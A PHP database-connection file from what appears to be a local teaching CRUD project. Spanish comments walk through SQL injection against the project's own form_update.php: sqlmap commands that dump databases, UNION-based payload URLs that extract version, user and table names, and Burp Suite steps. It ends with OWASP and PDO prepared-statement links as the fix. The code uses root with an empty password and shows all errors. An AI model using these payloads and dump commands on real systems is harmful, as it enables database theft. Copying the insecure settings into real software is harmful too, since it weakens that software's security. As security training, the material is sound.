<?php
// $mysqli = new mysqli("localhost", "root", "", "crud_php_v1"); // windows
ini_set('display_errors', 1);
ini_set('display_startup_errors', 1);
error_reporting(E_ALL);

$name_database = "crud_php_v1";
$user = "root";
$pwd = "";

try {
    $mysqli = new PDO('mysql:host=localhost;dbname='.$name_database, $user, $pwd);
} catch (PDOException $e) {
    print "¡Error!: " . $e->getMessage() . "<br/>";
    die();
}

/*

SQLi con SQLMap

1.- Dumpeamos la base de datos. Con esto obtendremos el nombre de la base de datos
sqlmap -u "http://localhost/crud_php_v1/form_update.php?id=3" --dbs

2.- Dumpeamos todas las tabals de la base de datos.Con esto obtendremos todas las tablas de la base de datos deseada
sqlmap -u "http://localhost/crud_php_v1/form_update.php?id=3" -D crud_php_v1 --dump-all --batch

---------------------------------------------------------------------------------------------------------------------------------------

Links de investigacion
https://sqlmap.org/
https://github.com/sqlmapproject/sqlmap/wiki/Features
https://github.com/sqlmapproject/sqlmap/wiki/Presentations
https://github.com/sqlmapproject/sqlmap
https://github.com/sqlmapproject/sqlmap/wiki/FAQ
https://secnhack.in/multiple-ways-to-dump-website-database-via-sqlmap/

Url local de prueba del sistema
http://localhost/crud_php_v1/form_update.php?id=3

*/

/*

SQLi Manual

1.- Primero probamos si es propenso a un ataque de la vulnerabilidad
Pa esto bsucamos la url en donde lleve un parametro y al final le agregamos una comilla simple

Posteriormente realizamos el tipo basado en union (aqui debemos explicar en que consiste un UNION de sql)
http://localhost/crud_php_v1/form_update.php?id=3%27%20UNION%20ALL%20SELECT%20NULL--%20-

SELECT * FROM persona WHERE id = '3' UNION ALL SELECT NULL;-- -'

Debemos hacer esto hasta que ya no de error

SELECT * FROM persona WHERE id = '3' UNION ALL SELECT NULL,NULL,NULL,NULL;-- -'

Cambiamos la condicion para que nos pueda mostrar todos las columnas que querramos que vengan despues del union, al final la url quedaria asi
http://localhost/crud_php_v1/form_update.php?id=10%27%20UNION%20ALL%20SELECT%20%27A%27,%20@@version,user(),database()--%20-
@@version - es la version del gestor de base de datos
user() - es el usuario de la base de datos
database() - es el nombre de la base de datos

http://localhost/crud_php_v1/form_update.php?id=10%27%20UNION%20ALL%20SELECT%20NULL%20,group_concat(table_name),user(),4%20from%20information_schema.tables%20where%20table_schema=database()--%20-
group_concat(table_name) y from information_schema.columns where table_schema=database()- obtiene hace una concatenacion de todos los nombres de la base de datos


Cadena de query original
id=-3553' UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x717a626271,0x63465358686a794569716f6c426376654e514e4e47596b42754b445967455565424d42705550677a,0x717a786a71)-- -

--------------------------------------------------------------------------------------------------------------------------------------------------------------------

Links de investigacion
https://sqliteonline.com/
https://www.w3schools.com/sql/sql_union.asp
https://resources.infosecinstitute.com/topics/hacking/dumping-a-database-using-sql-injection/

Url local de prueba del sistema
http://localhost/crud_php_v1/form_update.php?id=3

*/

/*

SQLLi con Software POroxy (Burp Suite - Community Edition)

Descarga y lo que incluye la version que se usara
https://portswigger.net/burp/communitydownload

Documentacion para Community Edition
https://portswigger.net/burp/documentation/desktop

Requerimientos
https://portswigger.net/burp/documentation/desktop/getting-started/system-requirements

Guia de inicio rapido
https://portswigger.net/burp/documentation/desktop/getting-started

1.- Abrimos buurp suite le damos en las opciones pro default de las dos primeras pantallas
2.- Seleccionamos la pestaña que dice "Proxy"
3.- Clic en el boton intercept on
4.- CLic en el boton open browser
5.- Se abrira el browser y accederemos al la url que querramos interceptar el http
6.- Le damos forward (next - siguiente) hasta terminar de cargar la pagina de la url
7.- EN el historial podemos ver el request y response de esa url

cadedna de prueba de sql injection - esto se pone en el value del burp suite
10' UNION ALL SELECT 'A', @@version,user(),database()-- -

Ejemplos de SQLi con sentencias INSERT SQL
https://infosecwriteups.com/sql-injection-with-insert-statement-bdcf4d47d178
https://stackoverflow.com/questions/681583/sql-injection-on-insert
https://labs.detectify.com/ethical-hacking/sqli-in-insert-worse-than-select/
https://www.exploit-db.com/docs/33253

*/

/*

Documentacion general sobre SQLi
https://portswigger.net/web-security/sql-injection

*/


/*

Solucion a vulnerabilidad inyeccion SQL (enfocado a php)

https://owasp.org/www-community/attacks/SQL_Injection
https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html
https://www.php.net/manual/es/book.pdo.php
https://www.php.net/manual/es/pdo.connections.php
https://www.php.net/manual/en/pdo.prepare.php
https://www.php.net/manual/es/pdostatement.bindparam.php
https://www.php.net/manual/es/pdostatement.bindvalue.php
https://www.php.net/manual/es/pdostatement.execute.php
https://www.php.net/manual/es/pdostatement.fetch.php
https://www.php.net/manual/es/pdo.constants.php
https://www.php.net/manual/en/pdo.query.php

insert pdo php
https://www.phptutorial.net/php-pdo/php-pdo-insert/

*/
